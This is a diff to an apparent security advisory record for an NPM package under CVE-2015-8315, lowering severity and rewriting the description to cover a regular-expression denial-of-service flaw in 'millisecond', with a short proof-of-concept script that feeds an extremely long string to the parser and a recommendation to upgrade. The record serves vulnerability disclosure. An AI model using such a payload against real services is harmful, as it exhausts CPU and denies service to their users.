@@ -1,5 +1,5 @@
 {
-  "Severity": "HIGH",
+  "Severity": "MODERATE",
   "UpdatedAt": "2017-10-24T18:33:36Z",
   "Package": {
     "Ecosystem": "NPM",
@@ -27,12 +27,12 @@
         "Value": "CVE-2015-8315"
       }
     ],
-    "Description": "The ms package before 0.7.1 for Node.js allows attackers to cause a denial of service (CPU consumption) via a long version string, aka a \"regular expression denial of service (ReDoS).\"",
+    "Description": "Versions of `millisecond` prior to 0.1.2 are affected by a regular expression denial of service vulnerability when extremely long version strings are parsed.\n\n\n## Proof of concept\n```\nvar ms = require('millisecond');\nvar genstr = function (len, chr) {\n   var result = \"\";\n   for (i=0; i\u003c=len; i++) {\n       result = result + chr;\n   }\n\n   return result;\n}\n\nms(genstr(process.argv[2], \"5\") + \" minutea\");\n```\n\n\n## Recommendation\n\nUpdate to version 0.1.2 or later.",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2017-10-24T18:33:36Z",
-    "Severity": "HIGH",
-    "Summary": "High severity vulnerability that affects ms",
-    "UpdatedAt": "2019-07-03T21:01:59Z",
+    "Severity": "MODERATE",
+    "Summary": "Regular Expression Denial of Service in millisecond",
+    "UpdatedAt": "2020-08-31T18:09:41Z",
     "WithdrawnAt": ""
   },
   "Versions": [
